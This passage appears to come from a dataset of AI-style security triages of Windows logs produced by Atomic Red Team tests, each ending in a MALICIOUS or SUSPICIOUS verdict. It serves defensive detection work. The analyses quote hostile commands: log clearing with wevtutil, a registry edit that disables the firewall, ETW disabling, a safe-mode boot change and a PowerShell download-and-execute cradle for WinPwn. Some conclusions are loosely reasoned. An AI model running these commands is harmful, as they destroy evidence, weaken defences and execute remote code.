   - Assess access controls and ensure that privileges are appropriately assigned. Limited admin access can help mitigate such risks.
4. **Deploy Endpoint Protection:**
   - Ensure that endpoint detection and response (EDR) solutions are actively monitoring all systems to detect similar activities.
5. **Forensic Examination:**
   - Consider conducting a forensic examination of the system to recover and analyze any potential malware artifacts or additional details about the attack method.

By taking these steps, the organization can mitigate further risks and enhance its security posture against similar incidents."
Activate Windows NoClose Group Policy Feature,"Upon reviewing the provided logs, several key observations can be made:

1. **Event Log Clearing**: 
   - The logs show multiple instances of the `wevtutil.exe` command being used to clear event logs like Security, System, Application, and Windows PowerShell. This is evidenced by Event ID 1102 from the Security log and Event ID 104 from the System log. The `wevtutil.exe` commands seen in the logs explicitly target various logs for clearing, likely to remove forensic evidence of prior actions.
   - This activity was conducted by a user with the username `admin_test`, indicating it was executed by an administrative account.

2. **Privilege Escalation and Unusual Commands**:
   - The process tree involving `cmd.exe` and `reg.exe` shows an attempt to modify registry keys (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`). The command modifies the `NoClose` policy to prevent shutting down the system, which is a common indicator of potential malicious intent to maintain access.
   - The execution of `whoami.exe` and `hostname.exe` suggest possible reconnaissance activities to gather system and user information.

3. **Time Change Activity**:
   - The logs indicate some manipulation of system time (Event ID 4616) using the `svchost.exe` process. This can sometimes be used to evade detection mechanisms dependent on timestamps, but in this context, it coincides with other suspicious activities.

4. **Multiple Service Stops**:
   - The logs reflect the stopping of certain services, such as those related to Microsoft Edge Update. Service manipulation might be an attempt to disable key services to evade detection or prevent interference.

Overall, the combination of these activities — especially the clearing of event logs, modification of registry settings, and the possible concealment activities — portrays behavior consistent with attempts to cover tracks and possibly maintain unauthorized access. These actions strongly suggest an attempt to hide potentially malicious activities, characteristic of a security breach or compromise.

**Final Assessment**: 
The activities observed in the logs are indicative of malicious intent. Based on the cleared logs, system changes, and registry modifications, there is clear evidence of activities aligning with malicious tactics.

**Resolution: MALICIOUS**

**Guidance**:
- Initiate an immediate containment and investigation to identify the source of the unauthorized activity and potential impact.
- Inspect other systems for similar activities indicating lateral movement or broader compromise.
- Restore from clean backups if necessary, and strengthen security measures, including user rights management, auditing policies, and endpoint protection. 

- Report the incident to the appropriate cybersecurity response team to further analyze and neutralize any persistent threats."
Regsvr32 local COM scriptlet execution,"Upon reviewing the Windows event logs provided, several key observations point to suspicious and potentially malicious activity:

1. **Use of `wevtutil.exe`:** The frequent execution of `wevtutil.exe` with varying command lines `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, and `cl Security` is worth noting. This command is commonly used to clear event logs, which could be an attempt to hide potentially malicious activities. 

2. **Clearing of Event Logs:**
   - The `Sysmon`, `Application`, and `System` logs show the use of `wevtutil.exe` associated with clearing event logs. Events with `EventID 104` and `EventID 1102` corroborate this. Clearing event logs using an administrative account can indicate an attempt to cover tracks.
   - The process `wevtutil.exe` associated with `Windows PowerShell` and `System` channel clearing raises further suspicion.

3. **Execution of `regsvr32.exe` with Scriptlet:** An event involving `regsvr32.exe` using `/s /u /i:""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.010\src\RegSvr32.sct"" scrobj.dll` is particularly concerning. This technique is associated with 'Living off the Land Binaries' (LOLBins), often used to execute scripts without directly launching malicious executables. The presence of ""AtomicRedTeam"" in the path suggests this could be a simulation of a known attack technique (T1218.010).

4. **Processes Escalating Privileges:**
   - Several processes including PowerShell and `cmd.exe` run with a high integrity level, potentially indicating privileged operations.
   - The parent-child process relationships (e.g., `wsmprovhost.exe` launching `wevtutil.exe`) suggest automation or task scripting associated with elevated permissions.

5. **Normal and Benign Activity:**
   - Activities involving `MicrosoftEdgeUpdate.exe` and its related components do not deviate from standard behavior associated with application updates and system maintenance.

### Conclusion

While routine system maintenance and legitimate administrative tasks could explain some logs, several indicators suggest that there might be an attempt to perform unauthorized and potentially harmful actions on the system:

- **Clearing of Event Logs** is a significant red flag. It's a technique often used by attackers to delete evidence of their presence.
- **Use of `regsvr32.exe` with a `.sct` file** is a known technique for bypassing security controls and indicates malicious intent.

Based on the analysis, the activity observed in these logs is categorized as **MALICIOUS**. Immediate actions should be taken to contain and remediate this activity, including:

- Investigating processes associated with `admin_test` for unauthorized activities.
- Reviewing system changes post-execution of `regsvr32.exe`.
- Enhancing monitoring for further attempts to clear logs or execute commands using suspect binaries.
- Conducting a thorough security audit and potential system re-imaging if unauthorized access is confirmed."
Command Execution with NirCmd,"The provided logs contain several indicators of potentially malicious activity. Here's a detailed analysis of the logs:

### Indicators of Potential Malicious Activity:
1. **Log Cleared Events:**
   - The Security log (Event ID 1102) and the System log (Event ID 104) indicate that logs were cleared by the user `admin_test`. Clearing logs can be an indicator of an attempt to hide tracks after malicious activities.

2. **Suspicious PowerShell Activity:**
   - The PowerShell log shows the execution of a command intended to hide the clock from the taskbar using `nircmd.exe`, a command-line utility known for its diverse functionalities, including manipulating the system state and, ironically, often used in legitimate administrative tasks as well as by cybercriminals.

3. **Execution of Suspicious Commands:**
   - Several Sysmon logs (IDs 17991, 17993, 17994) reveal potentially suspicious command-line executions by `cmd.exe` and `nircmd.exe` triggered through PowerShell. These actions are tied to hiding windows elements which could be used for stealth purposes during an unwanted activity.

4. **Use of `wevtutil.exe` to Clear Logs:**
   - The Sysmon logs indicate the use of `wevtutil.exe` to clear various logs, executed by `admin_test`. This is a strong indicator of potential malicious activity, as attackers often clear logs to cover their tracks after gaining unauthorized access.

5. **Elevation of Privileges:**
   - The presence of multiple events with elevated privileges (Event ID 4672) suggests the user `SYSTEM` has a range of sensitive privileges that could be exploited.

6. **Credential Access Attempts:**
   - Repeated attempt to access Microsoft accounts credentials using `WindowsLive` and `MicrosoftAccount` services failing with specific return codes might indicate attempts to access or use stored credentials (Event IDs 5379).

### Assessment:
The logs present a case that suggests potential unauthorized and suspicious activity on Server002, likely by the `admin_test` user account. The sequence of actions—clearing of logs, suspicious execution of commands, combined with attempts to access credential data—form a pattern consistent with malicious behavior or at least with activity aiming at secrecy and unauthorized access.

### Resolution:
- **MALICIOUS**: Based on the logs provided, the activities are strongly indicative of malicious behavior. The actions listed above align with tactics commonly employed by attackers looking to exploit a compromised system while hiding evidence of their activities.

### Recommendations:
1. **Immediate Containment:**
   - Isolate the affected system (Server002) to prevent any further suspicious activity and compromise of other network systems.

2. **Credential Security:**
   - Reset passwords and review access policies for the `admin_test` account, as well as any other admin-level accounts.

3. **Log Analysis:**
   - Perform a detailed analysis of all logs associated with Server002 for a broader timeframe to identify other potentially suspicious activities.

4. **System Restoration:**
   - Consider restoring the system from a clean backup to ensure all potential malicious applications and scripts are completely removed.

5. **Security Audit:**
   - Conduct a thorough security audit and enhance monitoring for similar suspicious patterns in the future.

6. **Enhance Security Controls:**
   - Apply additional security measures such as multi-factor authentication, updated patch management, and user education against social engineering attacks.

Given the severity and nature of the events captured in the logs, treating this as a significant security incident is well justified."
DiskShadow Command Execution,"Upon reviewing the provided Windows event logs, several events indicate potentially suspicious activities, particularly related to log clearing and the use of PowerShell:

1. **Log Clearing Events**:
   - **System Log**: Event ID 104 shows that the `System` log was cleared by `admin_test` on `2024-10-25 21:34:43.5810960`.
   - **Windows PowerShell Log**: Event ID 104 shows the `Windows PowerShell` log was also cleared by the same user at `2024-10-25 21:34:43.7203754`.
   - **Security Log**: Event ID 1102 indicates that the `Security` log was cleared by the user `admin_test` at `2024-10-25 21:34:43.6569667`.
   - Clearing security logs is a known tactic used by malicious actors to cover up tracks and avoid detection.

2. **PowerShell Activity**:
   - **Sysmon Log**: Event ID 1 and Event ID 5 report the execution of `powershell.exe` with a suspicious command line, indicating the use of `diskshadow.exe` and leveraging a script from `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218\\src\\T1218.txt`.
   - The use of tools like `diskshadow.exe` can be indicative of malicious activity, as it can be used for volume shadow copy manipulations - a common technique for backup or persistence by adversaries.

3. **Atomic Red Team Indication**:
   - The use of the `AtomicRedTeam` path suggests that there might be some testing or simulation of offensive tactics. However, if this was not planned or known by the organization, it can indicate malicious testing or even exploitation attempts.

Based on these observations, the behavior of clearing logs combined with the execution of potentially malicious PowerShell commands strongly suggests nefarious actions. The presence of `AtomicRedTeam` scripts could either be benign if validated as authorized simulation testing or could indicate unauthorized red team activity or abuse by an external actor.

### Resolution: MALICIOUS

### Assessment & Guidance:
- **Immediate Action**: Conduct a thorough investigation into the actions taken by user `admin_test`. Determine if this activity was authorized or if the credentials were compromised.
- **Containment**: Isolate the affected machine (Server002) from the network to prevent any potential further exploitation or data exfiltration.
- **Investigation**: Review other logs and systems for additional indicators of compromise that might align with this activity.
- **Remediation**: Consider resetting any affected credentials and investigating further into potential vulnerabilities that were exploited.
- **Monitoring**: Enhance monitoring for PowerShell and log clearance events to detect similar patterns in the future.
- **Awareness**: Confirm if there is any legitimate red team exercise ongoing and if Atomic Red Team scripts are being used; communicate and document any authorized simulation testing.

This assessment should be corroborated with any available context or further analysis to ensure an appropriate response."
Rundll32 advpack.dll Execution,"Based on the provided event logs from the Windows host, the following observations and analysis have been made:

### Observations:

1. **Cleared Event Logs (Indicators of Log Tampering)**:
    - The system, Windows PowerShell, and security event logs show entries indicating that logs were cleared by the user `admin_test`. Specifically:
        - System Log Cleared: EventID 104 for both System and Windows PowerShell logs.
        - Security Log Cleared: EventID 1102.
    This behavior is suspicious since clearing logs can be an indicator of an attempt to cover tracks or hide malicious activity.

2. **Unusual Command Line Activity**:
    - **PowerShell Execution**: The entry shows PowerShell execution, which is common for administrative tasks but often used for malicious purposes as well.
    - **Wevtutil Executions**: Several occurrences of the Windows Event Utility tool (`wevtutil.exe`) being used to clear logs (sysmon, operational, application, system) were observed. While it can be legitimate, in the context of cleared logs, it raises suspicion.
    - **CMD Execution with Rundll32**: Execution of `cmd.exe` with `rundll32.exe` from a temporary directory, `AtomicRedTeam` path, indicates simulated or potential testing of attack techniques (specific reference T1218.011) or a misconfigured detection test running.

3. **Normal System Activity**:
    - **Microsoft Edge Updates**: Multiple events related to the Microsoft Edge Update service executing normally.
    - **Windows Defender**: Indication that Windows Defender remained in an operational state.

### Assessment:

Given the combination of these activities, particularly the cleared logs and use of potential exploitation techniques and enumeration commands (like `whoami.exe`), it appears there was an attempt to obfuscate actions taken on this machine. While some logs could suggest benign actions, in combination with the log clearing, they appear suspicious.

### Resolution:
- **SUSPICIOUS**: The logs contain activities that are suspicious and warrant further investigation. The cleared event logs and specific command-line activities (particularly from temporary directories and references to known TTPs like loading an INF file using `rundll32.exe`) raise red flags that cannot be immediately classified as purely benign without further context and investigation.

### Guidance:

1. **Immediate Actions**:
    - Investigate the source and intention behind the log clearing, particularly focusing on the user `admin_test`.
    - Review any other logs or data from neighboring systems to see if similar activities have been recorded.
    - Engage with the user `admin_test` to clarify recent actions and their purpose.
  
2. **Further Investigation**:
    - Check system integrity, verify signatures, and scan for any signs of unauthorized changes or malware.
    - Cross-reference other security tools and logs (e.g., AV logs, network activity) to identify correlated anomalies.
  
3. **Preventive Measures**:
    - Enhance monitoring and alerts for log clearance and similar suspicious activities.
    - Consider deploying additional security controls or modifying existing ones to prevent misuse of tools like `wevtutil` and PowerShell without proper logging and justification.

Thus, due to the presence of suspicious activities, further actions and precautions should be taken to assess and address potential risks on this system."
Safe Mode Boot,"Upon reviewing the provided logs, several points of interest are observed that could indicate potential malicious activities:

1. **Frequent Execution of `wevtutil.exe`**: The logs indicate frequent execution of the `wevtutil.exe` process with the command line parameters suggesting the clearing of event logs. This behavior can often be associated with threat actors trying to cover their tracks by erasing log entries.

2. **Clearing of Logs**: Specifically, the logs indicate that:
    - The `System`, `Application`, and `Windows PowerShell` event logs are being cleared (`EventID: 104` in the System log for Sysmon, Security, and Windows PowerShell logs).
    - The `Security` log being cleared is captured by the event (`EventID: 1102`).

3. **Execution of `bcdedit` Command**: The execution of the command `bcdedit /set safeboot network` via `cmd.exe`, indicates an attempt to modify boot configurations. This command can be indicative of a threat actor setting the machine to boot in safe mode with networking, potentially as a step before performing further malicious actions without interference from security solutions.

4. **High Integrity Levels**: Many actions are executed with high integrity levels, signaling administrative privileges are applied, which is typical for extensive, system-level modifications.

5. **Process Execution by `admin_test` User**: All suspicious activities such as clearing logs and executing system commands involve the user `SERVER002\admin_test`. While this could be a legitimate administrative user, these activities collectively could suggest misuse or compromise of these credentials.

6. **Execution Context**: The process `wsmprovhost.exe` serves as a parent process for several executions of `wevtutil.exe`, indicating automation or scripting invocation, which aligns with suspicious activities.

7. **No Details in Application or PowerShell Logs**: While the logs indicate activities surrounding log clearance, specifics from PowerShell or application logs are unavailable due to log clearance, suggesting an intentional attempt to obscure activities.

**Assessment and Resolution**: 

Based on the patterns observed, notably the execution and immediate log clearance of key security and system logs, as well as boot configuration changes, this series of events is highly consistent with malicious activity designed to execute tasks stealthily and cover tracks by eliminating evidentiary logs.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediate containment of the affected system to prevent further unauthorized activities.
- Investigation into the `admin_test` account should be prioritized to understand access and actions it performed.
- Full forensic analysis is advised to recover cleared logs using potential recovery tools and techniques.
- Review of additional devices on the network for similar behaviors.
- Strengthen logging and security measures, and consider user education and awareness programs regarding credential handling."
InstallUtil Uninstall method call - -U variant,"### Analysis of the Provided Logs

#### 1. **Windows PowerShell Log:**
- The provided PowerShell logs indicate the use of a script located at `""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.004\src\InstallUtilTestHarness.ps1""`. This is associated with Atomic Red Team testing, which is a framework used for simulating various attack techniques (in this case, T1218.004 refers to the use of InstallUtil for executing code).
- The script uses PowerShell to load and execute a .NET assembly (`T1218.004.dll`) and checks for expected and actual output discrepancies.

#### 2. **System Log:**
- The system log shows that the logs for System and Windows PowerShell were cleared by the user `admin_test` on `Server002`. Clearing of logs is a common indicator of malicious activity as it may be an attempt to cover up unauthorized actions.

#### 3. **Sysmon Log:**
- Multiple entries logged the use of the `wevtutil.exe` (Eventing Command Line Utility) by the user `admin_test` to clear logs, which confirms the system log evidence of log clearing.
- The entries also show the execution of `powershell.exe` with similar commands seen in the PowerShell logs, which aims to test or execute code using InstallUtil.
- The `csc.exe` and `cvtres.exe` processes are related to compiling and linking C# source code, likely part of the InstallUtil misuse in the Atomic Red Team test.
- `InstallUtil.exe` is used, which is typically leveraged in living-off-the-land binary (LOLBIN) attacks.

#### 4. **Security Log:**
- Again confirms the clearing of security logs, which is a strong indicator of malicious intent, particularly when associated with activities trying to bypass detection mechanisms.

### Assessment:

Given the activities observed—specifically the clearing of system, PowerShell, and security logs (a common evasion tactic), use of InstallUtil alongside Atomic Red Team tests, and consistent involvement of administrative privileges—it indicates a possible simulation of a known attack technique (T1218.004). The actions are consistent with a controlled test of red teaming exercises or may denote an actual attempt at using these simulations for nefarious purposes.

### Resolution:
- **SUSPICIOUS:** These logs reveal suspicious activity involving the misuse of system tools for potentially unauthorized operations. This requires further investigation to verify whether these actions align with a red team operation or an actual compromise. Examine confirmation of authorized testing or red teaming from relevant stakeholders, and ensure that if no authorization is present, engage incident response procedures immediately.

### Guidance on How to Proceed:
1. **Verify User Activity:** Reach out to the user `admin_test` or the system administrator to confirm whether there are ongoing authorized red team simulations or tests.
2. **Cross-Check Alerts:** Consult other monitoring systems or SIEM alerts that might provide additional context on this user’s activities.
3. **Implement Controls:** Enhance monitoring on `Server002` for any unapproved or malicious use of administrative utilities. Consider implementing additional logging and alerting to catch future log-clearing activities.
4. **Audit Similar Systems:** Extend the investigations to other systems that the same user or similar profiles might have accessed to uncover further anomalies.

Ensure all findings and actions taken are well-documented for both security audit purposes and future analysis."
Ursnif Malware Registry Key Creation,"Upon reviewing the provided Windows event logs, specifically from the System, Sysmon, Security, and Application logs, several elements stand out as potentially indicative of malicious activity. Below is a detailed analysis containing key observations and their implications:

1. **Event Log Clearing**:
   - Multiple entries in the System log (EventID: 104) and Security log (EventID: 1102) indicate that various logs have been cleared. The command `wevtutil.exe cl` is used to clear logs, and the log clearing action was initiated by the user `admin_test`. Clearing logs without prior notice or explanation is highly suspicious as it is often associated with attempts to hide malicious activity.

2. **Process Observations**:
   - There are multiple instances of `wevtutil.exe` being executed with command lines that indicate log clearing (`cl`) for ""System"", ""Windows PowerShell"", and ""Security"" logs. The execution of `wevtutil.exe` by a high-level integrity process (`IntegrityLevel"":""High""`) further accentuates the suspicion that someone with administrative privileges attempted to hide their tracks.
   - A `cmd.exe` process has been observed executing a potentially harmful command line: `""cmd.exe"" /c reg add HKCU\Software\AppDataLow\Software\Microsoft\ 3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY /d 72656463616e617279 /f`. This command performs a registry modification, which can be indicative of persistence mechanism or configuration of a malware component.

3. **Time Change Events**:
   - Security logs (EventID: 4616) indicate that the system time has been modified twice. Changing system time can be utilized by attackers to confuse time-stamped logs for hindering log analysis.

4. **Execution of Administrative Tools**:
   - The `hostname.exe`, `whoami.exe`, and several instances of `conhost.exe` were executed. This behavior resembles reconnaissance commands, often part of an attack chain to collect brief system information and determine the current user's privileges.

5. **Privileges**:
   - All suspicious processes were run under the same user context `SERVER002\\admin_test`, and often with a high level of integrity. Given that this username was also responsible for clearing logs, this indicates potential misuse of administrative credentials.

Based on the observations and analysis above, the activity captured in these logs is highly suggestive of potentially malicious activity. Clearing event logs, registry modifications, systemic time changes without valid operational reason, and the combination of processes executed strongly suggest an attempt to obfuscate unauthorized actions or preparations for further compromise.

**Resolution: MALICIOUS**

**Guidance**:
- Immediate containment measures should be initiated for the host `Server002` to prevent any potential ongoing activities.
- Begin a thorough forensic investigation to understand the full scope and intent of unauthorized actions.
- Audit and review administrative access policies and credentials, considering a full password reset for administrators and critical users.
- Check for any additional artifacts of persistence, lateral movement, or data exfiltration.
- Ensure logging and monitoring mechanisms are intact and alert for further anomalies or unauthorized access attempts.
"
WinPwn - UAC Bypass ccmstp technique,"Based on the logs provided, I have identified several indicators of suspicious and potentially malicious activity involving a Windows host, Server002. Here's a detailed analysis:

1. **Suspicious PowerShell Activity:**
   - There are multiple instances of PowerShell execution with command-line arguments that include downloading and executing scripts from a potentially malicious repository: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/.../WinPwn.ps1`.
   - The script includes a UAC (User Account Control) Bypass technique, specifically `ccmstp`, to elevate privileges and execute `calc.exe`. This behavior is characteristic of privilege escalation attempts and exploitation.
   - The use of `iex(new-object net.webclient).downloadstring()` in PowerShell to obtain and execute a script from an external source is a commonly observed technique in malware deployments.

2. **Event Log Clearing:**
   - System, PowerShell, and Security logs have events indicating they were cleared by the user ""admin_test"". This activity is not benign as it often signifies an attempt to cover tracks after malicious activity.

3. **Event Log Manipulation:**
   - Entries show the use of `wevtutil.exe` to clear logs (`cl` command) which is consistent with deliberate log manipulation to cover traces.

4. **Sysmon and Security Logs:**
   - Events in the Sysmon logs show multiple instances of `wevtutil.exe` clearing event logs. This is linked to the user ""admin_test"" and suggests malicious intent to erase evidence.
   - Security log records (event ID 1102) specifically indicate the Security event log was cleared.

5. **Time Changes:**
   - Security audit logs have entries of changes in system time, albeit by a system service (svchost.exe), this could indicate attempts to manipulate logs via timestamp alteration.

6. **Edge Update Processes:**
   - A large number of processes related to Microsoft Edge updates, although without direct connection to the main suspicious behavior, these need to be contextualized within the setting of the deployment if they are usual or due to forced updates.

Overall Analysis:
- The combination of PowerShell downloading and executing suspicious scripts, clearing of event logs, and attempts at possible privilege escalation using known bypass techniques point towards malicious activities being conducted on this host.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the impacted host (Server002) from the network to prevent further potential lateral movement by any attacker.
- Conduct a forensic analysis to capture memory and storage snapshots to preserve evidence for further investigation.
- Verify if similar activities have occurred on other hosts in the network.
- Change passwords and review permissions for ""admin_test"" and any other potentially compromised accounts.
- Consider deploying endpoint detection and response tools to monitor suspicious activities real-time.
- Review network logs to identify any outbound connections to suspicious domains or IPs linked to known threat actors."
Disable .NET Event Tracing for Windows Via Registry (powershell),"Based on the analysis of the provided Windows event logs, here are the findings:

1. **PowerShell Logs:**
   - Multiple PowerShell events (Event ID 600 and 400) indicate execution of a PowerShell command to modify a registry setting for .NET Framework: 
     ```
     New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType ""DWord"" -Force
     ```
   - Modifying the registry, especially targeting .NET Framework ETW (Event Tracing for Windows) settings, can be indicative of an attempt to disable certain event tracing features which might be used to cover up unauthorized activities.

2. **System Logs:**
   - Events indicating that both the System and PowerShell logs were cleared by the user ""admin_test"" (Event ID 104). Log clearing can be a red flag since it might be done to remove traces of unauthorized activities.
   - The time was changed (Event ID 1) which might indicate an attempt to alter timestamps related to certain activities.

3. **Sysmon Logs:**
   - The presence of `wevtutil.exe` in Sysmon logs multiple times (Event ID 1 and 5) with command-line arguments like `wevtutil.exe cl System` and `wevtutil.exe cl ""Windows PowerShell""` suggests log clearing activities were carried out using this utility, again linked to the user ""admin_test"".
   
4. **Security Logs:**
   - Event ID 1102 indicates a Security log was cleared. This, along with PowerShell and System log clearing, heavily hints at anti-forensic behavior.

5. **Overall Assessment:**
   - The activities identified are suspicious and may indicate a potential compromise. Key indicators are registry modifications via PowerShell to disable .NET Framework ETW, clearing multiple event logs, and possible timestamp manipulation.
   - These actions align with techniques often used to conceal malicious activity.

**Resolution: SUSPICIOUS**

**Guidance:**
- Further investigation is required to validate these findings:
  - Conduct a detailed forensic analysis on `Server002` to identify any unauthorized access or malicious payloads.
  - Review user account activity for ""admin_test"" to determine if the account has been compromised.
  - Analyze network traffic logs for unusual patterns or communications associated with known command-and-control servers.
- Increase monitoring on the system and surrounding network segments.
- Notify the incident response team to manage potential exposure and mitigate associated risks."
LOLBAS Msedge to Spawn Process,"After a detailed analysis of the logs provided, I've identified several key points of evidence indicating suspicious and potentially malicious activity:

1. **Clearing of Event Logs:**
   - There are multiple instances where the Windows Event logs have been cleared (EventID 104 and EventID 1102). Specifically, the `Security`, `System`, and `Windows PowerShell` channels were cleared by a user `SERVER002\admin_test` at the same timestamp (""2024-10-25 21:59:21""). Clearing logs is often an indication of an attempt to hide traces of activities, which is a common malicious behavior.

2. **Suspicious PowerShell Usage:**
   - The PowerShell logs (`Windows PowerShell log`) show a command execution involving PowerShell to determine the location of Microsoft Edge and then using Edge to launch the calculator (`calc.exe`). 
   - The command launches calc.exe through Edge with modified command-line parameters for `--gpu-launcher`, indicating an abuse of the Edge browser to execute local programs, suggesting process hollowing or similar tactics usually used in attacks.

3. **Sysmon Logs Showing Process Executions:**
   - Multiple instances of processes related to the calculator (`calc.exe`) are being executed by a PowerShell script orchestrated by the `admin_test` user. Processes such as `taskkill` are used to terminate `msedge.exe` and `calc.exe`, which is part of the PowerShell script logic.
   - The presence of `cmd.exe` and `notepad.exe` initiated in this manner can suggest attempts to circumvent detection or conduct post-exploitation activities.

4. **Indicators of Automation:**
   - Automated and repetitive launching and killing of instances of `calc.exe` and `msedge.exe` reinforce the presence of an automated and possibly script-based attack sequence.

### Assessment:

- **SUSPICIOUS and POTENTIALLY MALICIOUS:** The act of clearing logs combined with unauthorized execution of commands via PowerShell using unusual parameters is highly indicative of malicious activity. While there can be benign purposes for such scripts, their presence combined with log clearance strongly points towards an attempt to obfuscate potentially harmful activities.

### Recommendations:

1. **Immediate Actions:**
   - Conduct a thorough endpoint investigation on `Server002` to check for further Indicators of Compromise (IOCs) and any persistent threats.
   - Temporarily isolate the server to prevent potential lateral movement within the network.
   
2. **Review User Activity:**
   - Investigate the user `SERVER002\admin_test` for unusual behavior or potentially compromised credentials.

3. **Increase Monitoring:**
   - Implement stricter monitoring on PowerShell activities and log clearing actions.
   
4. **Review Security Controls:**
   - Ensure all security patches are up to date, particularly those related to PowerShell execution policies and application whitelisting.

5. **Incident Response:**
   - Follow up with a full incident response to determine the scope, impact, and source of the breach, securing any vulnerabilities found during the investigation.

Given the evidence, this log review suggests a potential compromise scenario that needs further investigation."
Modify UsePartialEncryptionKey Registry entry,"Upon examining the provided event logs, several indicators suggest potential malicious activity or misuse:

1. **Wevtutil.exe Executions**: The Sysmon events show multiple executions of `wevtutil.exe` with the command `cl` (clear) on various event channels including `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`. The `wevtutil.exe` tool is usually employed to clear event logs and, when seen in such a pattern, can indicate attempts to cover up tracks after certain actions.

2. **Event Log Clearing**: Corresponding events from the System and Security logs (EventID: 104 for System log and EventID: 1102 for Security log) corroborate the clearing of these logs. This is a notable red flag, as event log clearing is a common tactic used to delete records of activity that could link actions back to an unauthorized or malicious user.

3. **Registry Modification via CMD**: A particular process chain involves `cmd.exe` being executed with a command to add or modify a registry entry (`UsePartialEncryptionKey`) using `reg.exe`. The command is executed in high integrity level, which suggests elevated privileges were used. Such registry manipulations could potentially alter system configurations in ways that enable persistence or evade defenses.

4. **Unusual Timestamp Adjustments**: Events from `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service` indicate small time adjustments. While these could be legitimate, they are suspicious if taken in context with other activities aimed at obfuscation, like the clearing of logs.

5. **Activity Patterns and User Context**: The user `SERVER002\\admin_test` appears frequently as the actor behind these actions. While this may be a legitimate user, the sequence of actions and the contexts (clearing logs, changing registry values) raise suspicions about either malicious intent or misuse of privileges.

### Conclusion
The collection of these events, particularly the systematic clearing of logs and registry modifications using elevated privileges, provides strong indicators of potential malicious activity. While each event on its own might be benign in certain administrative contexts, their combination suggests efforts to hide activity and potentially compromise the system.

### Resolution
**MALICIOUS** - The patterns observed in the logs are consistent with attempts to conceal unauthorized administrative changes and should be treated as malicious activity. It is recommended to:
- Immediately isolate `Server002` for further forensic investigation.
- Conduct a thorough review of administrative activities and privilege access.
- Ensure incident response plans are enacted to identify any broader compromise.
- Evaluate and monitor system and user activities closely moving forward."
Requires the BitLocker PIN for Pre-boot authentication,"## Analysis of Logs

### Indicators of Malicious Activity

1. **Use of Built-in Windows Tools**:
   - Multiple instances of `wevtutil.exe` being executed with the `cl` (clear) command on various logs - `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`. This command is used to clear event logs, which is a common technique employed by attackers to cover their tracks.

2. **User Context and Integrity Level**:
   - The commands are executed under the `SERVER002\admin_test` account with a high integrity level. While this isn't inherently suspicious, combined with the clearing of logs, it raises red flags.

3. **Registry Modification**:
   - Registry modification is observed via `cmd.exe` and `reg.exe`, specifically altering:
     ```
     HKLM\SOFTWARE\Policies\Microsoft\FVE
     ```
     This modification relates to encryption policies and could potentially be used to alter security settings.

4. **Log Clearing**:
   - Explicit log clearing entries are found in the System and Security logs, pointing to attempts to erase evidence of actions.

5. **Time Manipulation**:
   - Time changes recorded in the System and Security logs through `svchost.exe`. Attackers could adjust system time to manipulate log entries for various reasons.

### Summary of Findings

- The presence of `wevtutil` commands to clear logs in high integrity context suggests an attempt to hide potentially malicious activity.
- Registry changes might indicate preparation or configuration towards further compromise or a malicious payload.
- Time manipulation could further point towards an attacker attempting to tamper with log evidence.

Based on these observations, the logs present a pattern consistent with post-exploitation techniques.

### Assessment

- **Resolution: MALICIOUS** - The detected activities indicate purposeful log clearing and configuration masking efforts, indicative of malicious intent to obfuscate actions on the host.

### Guidance on How to Proceed

1. **Immediate Response Actions**:
   - Isolate the affected host from the network to prevent further spread or damage.
   - Preserve forensic evidence by creating a full disk image of the system.
   - Check for any unauthorized accounts or privilege escalations, especially those linked to the `admin_test` user.
   - Investigate for any known malicious signatures or IOCs linked to registry, time manipulation, and system processes.

2. **Remediation**:
   - Conduct a thorough malware scan and cleanup of the system.
   - Restore system and security configurations altered in the registry.
   - Review and enhance security policies to monitor high integrity level operations more closely.

3. **Long-term Measures**:
   - Implement logging solutions that send copies to a centralized repository to reduce the impact of local log clearing.
   - Increase the security awareness and training of users regarding the risks of using powerful utilities like wevtutil."
Disable Microsoft Defender Firewall via Registry,"Upon reviewing the provided logs from a Windows host, several points of interest and potential indicators of malicious activity are noted. Below is a detailed analysis of the suspicious activities:

1. **Clearing of Event Logs**:
   - Security Event ID 1102 indicates that the security log was cleared by ""admin_test"" at `2024-10-28 11:34:39.6516685`. Repeated clearing of logs without legitimate reasons is often a tactic used by attackers to cover their traces.

2. **Privilege Use and Logon Events**:
   - Security Event ID 4672 indicates the assignment of special privileges to ""admin_test"", including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are often used in attacks for privilege escalation.
   - Security Event ID 4624 shows a network logon (type 3) for ""admin_test"" from `192.168.0.102`, which should be validated against expected network activity for this administrator.

3. **Time Change Events**:
   - Event IDs 4616 within the logs show changes to the system time. Tampering with system time can be a method to manipulate time-based security controls or logging mechanisms.

4. **Suspicious Command-Line Executions**:
   - Sysmon Event 1 shows usage of `wevtutil.exe` for clearing various event logs, including ""Security"", ""System"", ""Application"", and ""Windows PowerShell"". This action corresponds with the explicit log-clearing records and suggests active concealment of actions on the host.
   - A command associated with disabling the firewall is executed: `reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile"" /v ""EnableFirewall"" /t REG_DWORD /d 0 /f`. This action compromises the system's security posture.

5. **Execution of Reconnaissance Commands**:
   - The execution of utilities such as `whoami.exe` and `hostname.exe` can suggest potential reconnaissance activity.

6. **System Services and Processes**:
   - Legitimate processes such as Microsoft's Edge Update process are seen executing, which appear routine in the context of software updates and do not align directly with malicious intent.

**Resolution**:
